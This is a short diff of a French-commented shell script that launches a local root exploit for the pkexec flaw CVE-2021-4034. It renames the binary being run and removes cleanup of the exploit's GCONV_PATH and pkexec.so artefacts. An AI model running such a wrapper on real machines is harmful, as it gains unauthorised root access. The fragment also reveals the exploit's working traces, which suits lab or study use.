@@ -16,9 +16,6 @@ id
 echo
 echo -e "${E}Exécution du programme : exit pour quitter le bash ${N}"
 echo
-./exploit
+./cve-2021-4034
 echo -e "${E}Supression des dossiers générés : ${N}"
-rm -rf GCONV_PATH=.
-# find -type l : Trouver le path du lien symbolique créé
-rm ./.pkexec/pkexec.so
 
